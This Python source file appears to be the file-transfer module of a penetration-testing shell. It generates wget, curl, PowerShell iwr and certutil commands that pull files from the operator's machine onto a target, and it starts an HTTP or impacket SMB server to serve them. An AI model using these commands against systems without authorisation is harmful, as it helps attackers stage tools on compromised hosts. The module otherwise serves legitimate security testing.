import os
import subprocess
import socket
import glob
from ..core.colors import log_info, log_success, log_error, log_warn, Colors
from ..core.base_shell import BaseShell
from .base import ArgumentParserNoExit, BaseModule, HelpExit
from ..core.utils import get_ip_address

class FileModule(BaseModule):
    # Templates for utilities
    TOOLS = {
        "wget": "wget http://{ip}:8000/{filename}",
        "wget_write": "wget http://{ip}:8000/{filename} -O {filename}",
        "curl": "curl http://{ip}:8000/{filename} -O",
        "curl_write": "curl http://{ip}:8000/{filename} -o {filename}",
        "iwr": "iwr http://{ip}:8000/{filename} -OutFile {filename}",
        "certutil": "certutil -urlcache -split -f http://{ip}:8000/{filename} {filename}",
        "scp": "scp user@{ip}:$(pwd)/{filename} .",
        "base64": "base64 {filename}"
    }

    def __init__(self, session):
        self.session = session

    def is_port_in_use(self, port):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            return s.connect_ex(('localhost', port)) == 0

    def run_download(self, filename, tool="wget", write=False, copy_only=False, edit=False, preview=False):
        if not filename:
            log_error("Filename is required.")
            return

        interface = self.session.get("INTERFACE")
        ip_addr = get_ip_address(interface)
        
        if not ip_addr:
            log_error(f"Could not find IP for interface {interface}")
            return

        # Determine Tool Key
        tool_key = tool
        if write and tool in ["wget", "curl"]:
            tool_key += "_write"
        
        cmd_template = self.TOOLS.get(tool_key)
        if not cmd_template:
            log_error(f"Unknown tool: {tool}")
            return

        cmd = cmd_template.format(ip=ip_addr, filename=filename)
        
        if copy_only or edit or preview:
            self._exec(cmd, copy_only, edit, run=False, preview=preview)
        else:
            log_success(f"Download Command ({tool}):")
            self._exec(cmd, copy_only=False, edit=False, run=False, preview=preview)
            
            # Auto-start server if not running
            if not self.is_port_in_use(8000):
                log_info("Autostarting HTTP server on port 8000...")
                self.run_server("http")

    def run_base64(self, filename, copy_only=False, edit=False, preview=False):
        if os.path.isfile(filename):
            log_success(f"Base64 encoded content of {filename}:")
            cmd = self.TOOLS["base64"].format(filename=filename)
            self._exec(cmd, copy_only, edit, preview=preview)
        else:
            log_error(f"File {filename} not found locally.")

    def run_server(self, server_type="http", preview=False):
        interface = self.session.get("INTERFACE")
        ip_addr = get_ip_address(interface)
        
        if not ip_addr:
            log_error(f"Could not find IP for interface {interface}")
            return

        cmd = []
        if server_type == "http":
            cmd = ["python3", "-m", "http.server", "8000"]
            msg = f"Starting HTTP server on {interface} ({ip_addr}:8000)..."
        elif server_type == "smb":
            cmd = ["sudo", "impacket-smbserver", "share", ".", "-smb2support"]
            msg = f"Starting SMB server on {interface}..."
        
        if preview:
            print(f"{Colors.OKCYAN}{' '.join(cmd)}{Colors.ENDC}")
            return
            
        log_info(msg)
        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nServer stopped.")

    def run(self, args_list):
        if "-download" in args_list:
            # Need filename
            # Simplistic parsing: find -download index, take next
            try:
                idx = args_list.index("-download")
                if idx + 1 < len(args_list):
                   filename = args_list[idx+1]
                   self.run_download(filename)
                else:
                    log_error("Usage: -download <filename>")
            except ValueError:
                pass
        elif "-base64" in args_list:
             try:
                idx = args_list.index("-base64")
                if idx + 1 < len(args_list):
                   filename = args_list[idx+1]
                   self.run_base64(filename)
             except ValueError: pass
        elif "-http" in args_list:
            self.run_server("http")
        elif "-smb" in args_list:
            self.run_server("smb")
        else:
             log_warn("No valid tool flag found. Use interactive mode.")


class FileShell(BaseShell):
    COMMAND_CATEGORIES = {
        "download": "File Transfer",
        "base64": "Encoding",
        "server": "Servers",
    }

    def __init__(self, session):
        super().__init__(session, "file")
        self.file_module = FileModule(session)

    def do_download(self, arg):
        """Generate download command: download <filename> [tool]"""
        arg, copy_only, edit, preview, _ = self.parse_common_options(arg)
        parts = arg.split()
        if not parts:
            log_error("Usage: download <filename> [tool]")
            return
        filename = parts[0]
        tool = parts[1] if len(parts) > 1 else "wget"
        # Optional write flag handling could be better in generic parsing, but keeping simple here
        self.file_module.run_download(filename, tool, write=False, copy_only=copy_only, edit=edit, preview=preview)

    def complete_download(self, text, line, begidx, endidx):
        """Autocomplete for download command"""
        args = line.split()
        if len(args) < 2 or (len(args) == 2 and not line.endswith(' ')):
            return [f for f in glob.glob(text + '*') if os.path.isfile(f)]
        elif len(args) < 3 or (len(args) == 3 and not line.endswith(' ')):
            tools = ["wget", "curl", "iwr", "certutil", "scp"]
            return [t for t in tools if t.startswith(text)]
        return []

    def do_base64(self, arg):
        """Base64 encode a file: base64 <filename>"""
        arg, copy_only, edit, preview, _ = self.parse_common_options(arg)
        if not arg:
            log_error("Usage: base64 <filename>")
            return
        self.file_module.run_base64(arg, copy_only, edit, preview)

    def complete_base64(self, text, line, begidx, endidx):
        """Autocomplete for base64 command"""
        return [f for f in glob.glob(text + '*') if os.path.isfile(f)]

    def do_server(self, arg):
        """Start a server: server [http|smb]"""
        arg, copy_only, edit, preview, _ = self.parse_common_options(arg)
        server_type = arg.strip() or "http"
        self.file_module.run_server(server_type, preview=preview)

    def complete_server(self, text, line, begidx, endidx):
        """Autocomplete for server command"""
        types = ["http", "smb"]
        if text:
            return [t for t in types if t.startswith(text)]
        return types
